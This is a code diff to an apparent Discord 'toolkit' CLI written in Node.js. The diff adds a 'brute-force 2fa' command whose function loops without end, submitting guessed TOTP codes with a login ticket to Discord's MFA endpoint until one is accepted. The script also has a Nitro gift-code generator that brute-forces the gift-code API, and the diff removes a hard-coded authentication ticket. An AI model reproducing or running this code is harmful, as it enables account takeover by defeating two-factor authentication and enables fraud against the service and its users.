@@ -48,6 +48,7 @@ function help() {
   console.log(`${MAGENTA}11)${RED} image search ${BLUE} | ${GREEN} finds similar images based on a url`);
   console.log(`${MAGENTA}12)${RED} cryptos ${BLUE} | ${GREEN} fetches current XMR, BTC, & ETH prices`);
   console.log(`${MAGENTA}13)${RED} make paste ${BLUE} | ${GREEN} makes a https://pastie.io/ paste | ${CYAN} Syntax: make paste <paste here>`);
+  console.log(`${MAGENTA}13)${RED} brute-force 2fa ${BLUE} | ${GREEN} brute forces a lost 2fa account | ${CYAN} Syntax: brute-force 2fa <authentication ticket>`);
 
   console.log(RESET);
 }
@@ -90,15 +91,16 @@ const length = 8;
 return `${result}`;
 }
 async function mfaBruteForcer(token){
-let codes = 10000;
-for (let i = 0; i < codes; i++){
-sleep(2000)
+for (var i = 0; i < Infinity; i++) {
+await sleep(3000)
 let auth = mfaGenerator();
-fs.readFile("codes.txt", async function (err, data) {
+console.log(`generating mfa codes...`)
+let tokenCheck = await fs.readFile("codes.txt", async function (err, data) {
   if (err) throw err;
   if(data.includes(`${auth}`)){
-  console.log(`invalid code`)
-} else {
+  return false;
+}});
+if (tokenCheck !== false){
   let content = `{
     "code": "${auth}",
     "ticket": "${token}",
@@ -131,11 +133,9 @@ let response = await fetch("https://discord.com/api/v9/auth/mfa/totp", {
 console.log(response.status)
 console.log(await response.json())
 if (response.status == 400){
-fs.writeFile('codes.txt', `${auth}\n`, { flag: 'a+' }, err => {})
+await fs.writeFile('codes.txt', `${auth}\n`, { flag: 'a+' }, err => {})
 } else if (response.status == 200) return `${GREEN}${auth}`;
-}
-});
-}}
+}}}
 function nitroGenerator(){
   const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   const length = 16;
@@ -147,8 +147,8 @@ function nitroGenerator(){
   return `${nitroCode}`;
 }
 async function nitro(codes){
-let nitroCode = nitroGenerator()
 for (let i = 0; i < codes; i++){
+let nitroCode = nitroGenerator()
 sleep(3000)
 sleep(1000)
 let e22z = await fetch(`https://discordapp.com/api/v9/entitlements/gift-codes/${nitroCode}`)
@@ -208,7 +208,7 @@ async function getSource(URL){
   );
 }
 async function main(){
-rl.question('Please enter a command: ', (answer) => {
+rl.question('Please enter a command: ', async (answer) => {
   if (answer == `exit`){
 console.log(`exiting...`)
 return process.exit()
@@ -251,15 +251,15 @@ if (check) {hook.send(`${check}`)}
 } else if (answer.startsWith(`clone webpage`)){
   var args = answer.split(' ');
   getSource(args[2])
+} else if (answer.startsWith(`brute-force 2fa`)){
+  var args = answer.split(' ');
+await mfaBruteForcer(args[2])
 }
 rl.pause()
 });
 return "command executed";
 }
 welcome();
-//console.log(moment)
-//console.log(JSON.stringify(moment))
-mfaBruteForcer(`WzU2MzQ3NzY0Njc3Njg2MDY3MiwibG9naW4iXQ.Yg6fLw.rETsY4NjX1lDk-04GwqqzbO8cJY`)
 main().then(console.log()).catch(console.err)
 rl.on('pause', () => {
 rl.resume()
